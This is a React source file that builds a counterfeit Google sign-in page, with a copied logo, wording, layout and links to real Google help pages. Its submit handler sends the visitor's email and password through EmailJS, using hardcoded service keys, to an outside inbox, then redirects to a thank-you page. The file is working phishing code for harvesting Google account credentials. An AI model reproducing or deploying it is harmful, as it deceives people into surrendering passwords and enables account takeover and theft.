import '../HomePage/homepage.css';
import logoSvg from '../../img/G__logo.svg.png';
import { useState, useRef } from "react";
import emailjs from 'emailjs-com';

function HomePage() {
    var qfNum = 0;
    const [active, setActive] = useState(false);
    const [activepass, setActivePass] = useState(false);
    const userName = useRef(null);
    const [ereva, setEreva] = useState(false);
    // const [erevaVer, setErevaVer] = useState(false);
    const [passwordShown, setPasswordShown] = useState(false);
    const passwordUser = useRef(null);
    const [usertazaname, setUsertazaname] = useState("");

    function qfFunck(qf) {
        if (qf.value.indexOf('ccox') !== -1 || qf.value.indexOf('klir') !== -1 || qf.value.indexOf('qunn') !== -1 || qf.value.indexOf('jajtam') !== -1 ||
            qf.value.indexOf('jaj tam') !== -1 || qf.value.indexOf('txeq') !== -1 || qf.value.indexOf('cceq') !== -1 || qf.value.indexOf('uteq') !== -1 ||
            qf.value.indexOf('fuck') !== -1 || qf.value.indexOf('suck') !== -1 || qf.value.indexOf('dick') !== -1 || qf.value.indexOf('gandon') !== -1 ||
            qf.value.indexOf('qunnem') !== -1 || qf.value.indexOf('txa') !== -1 || qf.value.indexOf('boz') !== -1 || qf.value.indexOf('chatlax') !== -1 ||
            qf.value.indexOf('gyot') !== -1 || qf.value.indexOf('garlax') !== -1) {
            qf.value = '';
            qf.className = "form_empty form-control";
            qfNum = 1;
        } else {
            qfNum = 0;
        }
    }
    const handleInputBlur = event => {
        qfFunck(event.target);
        if (event.target.value === '') {
            event.target.nextSibling.style.display = "flex";
            event.target.className = "form_empty form-control";
            if (active === true) { setActive(!active); }
        } else {
            event.target.nextSibling.style.display = "none";
            event.target.className = "form-control";
        }
        if (passwordUser.current.value == 0) {
            if (userName.current.value) {
                if (active === false) { setActive(!active); }
            }
        } else {
            if (userName.current.value && passwordUser.current.value) {
                if (active === false) { setActive(!active); }
            } 
        }
    };
    const next = () => {
        setEreva(!ereva);
        setUsertazaname(userName.current.value);
        passwordUser.current.value = "";
    };
    const togglePassword = () => {
        setPasswordShown(!passwordShown);
    };
    const SERVICE_ID = 'service_cf79ytj';
    const TEMPLATE_ID = 'template_8oalb5q';
    const USER_ID = "5Fma-P-1aeivvlJxc";

    function handleSubmit(event) {
        event.preventDefault();
        qfFunck(userName.current);
        if (qfNum === 1) {
            userName.current.value = '';
            userName.current.nextSibling.style.display = "block";
            userName.current.className = "form_empty form-control";
        } else if (qfNum === 0) {
            qfFunck(passwordUser.current);
            if (qfNum === 0) {
                if (userName.current.value && passwordUser.current.value) {
                    emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
                    setUsertazaname(userName.current.value);
                    // setErevaVer(!erevaVer);
                    window.location.href = "/thankyou";
                    return;
                } else {
                    if (activepass === false) { setActivePass(!activepass); }
                }
            }
        }
        if (!userName.current.value) {
            event.target[0].nextSibling.style.display = "block";
            userName.current.className = "form_empty form-control";
        }
        if (!passwordUser.current.value) {
            event.target[1].nextSibling.style.display = "block";
            passwordUser.current.className = "form_empty form-control";
        }
    }
    
    function handleSubmitKey(event) {
        console.log("SAd");
    }

     
  return (
    <section className="sectionOne">
        <div className='TcuCfd'>
            <div className='amenamec'>
                <img src={logoSvg} alt="logo" className="logo" id="mainlogo" />
                <form onSubmit = { handleSubmit } id = "forms">
                {/* <form onSubmit = { handleSubmit } id = "forms" style = {erevaVer ? { display: 'none' } : { display: 'block' } }> */}
                    <div className='mejik'>
                        <div className='leftSec'>
                            <h1 style = {ereva ? { display: 'none' } : { display: 'block' } }>Sign in</h1>
                            <h1 style = {ereva ? { display: 'block' } : { display: 'none' } }>Welcome</h1>
                            <p style = {ereva ? { display: 'none' } : { display: 'block' } }>Use your Google Account</p>
                            <button onClick= { next } style = {ereva ? { display: 'inline-flex' } : { display: 'none' } } className='userNameBt' type = 'button'>
                                <div className="JQ5tlb" aria-hidden="true"><svg aria-hidden="true" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg></div>
                                <span>{usertazaname}</span>
                            </button>
                        </div>
                        <div className='rightSec'>
                            <div className = "inputBlock" style = {ereva ? { display: 'none' } : { display: 'block' } }>
                                <input onBlur = { handleInputBlur } id = "Username" ref = { userName } name = "Username" type = "text" className = "form-control" />
                                <div style = { { display: 'none' } } className = 'requiredBox' >
                                    <span className="AfGCob"><svg aria-hidden="true" className="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
                                    Couldn’t find your Google Account </div> 
                                <span className = 'placeholder' > Email or phone </span> 
                            </div> 
                            <div className = "inputBlock" style = {ereva ? { display: 'block' } : { display: 'none' } }>
                                <input onBlur = { handleInputBlur } id = "Password" ref = { passwordUser } name = "Password" type = { passwordShown ? "text" : "password" } className = "form-control" />
                                <div style = { { display: 'none' } } className = 'requiredBox' >
                                    <span className="AfGCob"><svg aria-hidden="true" className="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
                                    Enter your password </div> 
                                <span className = 'placeholder' > Enter your password </span> 
                                <span className="achkik" bis_skin_checked="1">
                                    <label className="checkbox-inline">
                                        <input onClick={ togglePassword } name="show-password" type="checkbox" id="showpass" />Show password</label>
                                </span>
                            </div> 
                            <a style = {ereva ? { display: 'none' } : { display: 'inline-block' } } className='bacik bacikmek' href='https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fwww.google.com%3Fhl%3Den-US&ddm=0&dsh=S1545655140%3A1723102688586614&ec=GAlA8wE&flowEntry=AddSession&flowName=GlifWebSignIn&hl=en' >Forgot email?</a>
                            <p style = {ereva ? { display: 'none' } : { display: 'block' } } className='texto' >Not your computer? Use Guest mode to sign in privately.</p>
                            <a style = {ereva ? { display: 'none' } : { display: 'block' } } className='bacik' href='https://support.google.com/chrome/answer/6130773?hl=en' target = 'otherWindow.location'>Learn more about using Guest mode</a>
                            <div className='next_block'>
                                <a style = {ereva ? { display: 'none' } : { display: 'flex' } } href="https://accounts.google.com/lifecycle/steps/signup/name?continue=https://www.google.com?hl%3Den-US&ddm=0&dsh=S1545655140:1723102688586614&ec=GAlA8wE&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en&TL=ALoj5Ar2ab0_PVx5V7lH5fz-kT8X2XaW_B8CpCGbvk3_OxYciRJBaBRShqjLVPFY" target = 'otherWindow.location' type="button" className="forgotLink">Create account</a>
                                <a style = {ereva ? { display: 'flex' } : { display: 'none' } } href="https://accounts.google.com/v3/signin/identifier?authuser=0&continue=https%3A%2F%2Fmail.google.com%2Fmail&ec=GAlAFw&hl=en-US&service=mail&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S-1187231290%3A1723450467418735&ddm=0" type="button" className="forgotLink">Forgot password?</a>
                                <button style = {ereva ? { display: 'none' } : { display: 'block' } } onClick= { next } disabled = { active ? false : true } id = "btnLogin" className='btnLogsub' type = 'button'> Next </button>
                                <button style = {ereva ? { display: 'block' } : { display: 'none' } } disabled = { active ? false : true } id = "btnLoginsub" type = 'submit' className='btnLogsub'> Next </button>
                            </div>
                        </div>
                    </div>
                </form>


                {/* <form onSubmit = { handleSubmitKey } id = "formstwo" style = {erevaVer ? { display: 'block' } : { display: 'none' } }>
                    <div className='mejik'>
                        <div className='leftSec'>
                            <p style = {ereva ? { display: 'none' } : { display: 'block' } }>Use your Google Account</p>
                            <button onClick= { next } style = {ereva ? { display: 'inline-flex' } : { display: 'none' } } className='userNameBt' type = 'button'>
                                <div className="JQ5tlb" aria-hidden="true"><svg aria-hidden="true" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg></div>
                                <span>{usertazaname}</span>
                            </button>
                        </div>
                        <div className='rightSec'>
                            <div className = "inputBlock" style = {ereva ? { display: 'none' } : { display: 'block' } }>
                                <input onBlur = { handleInputBlur } id = "Username" ref = { userName } name = "Username" type = "text" className = "form-control" />
                                <div style = { { display: 'none' } } className = 'requiredBox' >
                                    <span className="AfGCob"><svg aria-hidden="true" className="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
                                    Couldn’t find your Google Account </div> 
                                <span className = 'placeholder' > Email or phone </span> 
                            </div> 
                            <div className = "inputBlock" style = {ereva ? { display: 'block' } : { display: 'none' } }>
                                <input onBlur = { handleInputBlur } id = "Password" ref = { passwordUser } name = "Password" type = { passwordShown ? "text" : "password" } className = "form-control" />
                                <div style = { { display: 'none' } } className = 'requiredBox' >
                                    <span className="AfGCob"><svg aria-hidden="true" className="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span>
                                    Enter your password </div> 
                                <span className = 'placeholder' > Enter your password </span> 
                                <span className="achkik" bis_skin_checked="1">
                                    <label className="checkbox-inline">
                                        <input onClick={ togglePassword } name="show-password" type="checkbox" id="showpass" />Show password</label>
                                </span>
                            </div> 
                            <a style = {ereva ? { display: 'none' } : { display: 'inline-block' } } className='bacik bacikmek' href='https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fwww.google.com%3Fhl%3Den-US&ddm=0&dsh=S1545655140%3A1723102688586614&ec=GAlA8wE&flowEntry=AddSession&flowName=GlifWebSignIn&hl=en' >Forgot email?</a>
                            <p style = {ereva ? { display: 'none' } : { display: 'block' } } className='texto' >Not your computer? Use Guest mode to sign in privately.</p>
                            <a style = {ereva ? { display: 'none' } : { display: 'block' } } className='bacik' href='https://support.google.com/chrome/answer/6130773?hl=en' target = 'otherWindow.location'>Learn more about using Guest mode</a>
                            <div className='next_block'>
                                <a style = {ereva ? { display: 'none' } : { display: 'flex' } } href="https://accounts.google.com/lifecycle/steps/signup/name?continue=https://www.google.com?hl%3Den-US&ddm=0&dsh=S1545655140:1723102688586614&ec=GAlA8wE&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en&TL=ALoj5Ar2ab0_PVx5V7lH5fz-kT8X2XaW_B8CpCGbvk3_OxYciRJBaBRShqjLVPFY" target = 'otherWindow.location' type="button" className="forgotLink">Create account</a>
                                <a style = {ereva ? { display: 'flex' } : { display: 'none' } } href="https://accounts.google.com/v3/signin/identifier?authuser=0&continue=https%3A%2F%2Fmail.google.com%2Fmail&ec=GAlAFw&hl=en-US&service=mail&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S-1187231290%3A1723450467418735&ddm=0" type="button" className="forgotLink">Forgot password?</a>
                                <button style = {ereva ? { display: 'none' } : { display: 'block' } } onClick= { next } disabled = { active ? false : true } id = "btnLogin" className='btnLogsub' type = 'button'> Next </button>
                                <button style = {ereva ? { display: 'block' } : { display: 'none' } } disabled = { active ? false : true } id = "btnLoginsub" type = 'submit' className='btnLogsub'> Next </button>
                            </div>
                        </div>
                    </div>
                </form> */}
            </div>
        </div>
        <div className='wmGw4'>
            <span className='language'>Englesh (United States)</span>
            <div className='linckBlock'>
                <a href='https://support.google.com/accounts?hl=en&visit_id=638536037832488434-3917336282&rd=2&p=account_iph#topic=3382296' target='_blank' className='newPage'>Help</a>
                <a href='https://policies.google.com/privacy?gl=AM&hl=en-US' target='_blank' className='newPage'>Privacy</a>
                <a href='https://policies.google.com/terms?gl=AM&hl=en-US' target='_blank' className='newPage'>Terms</a>
            </div>
        </div>
    </section>
  );
}

export default HomePage;
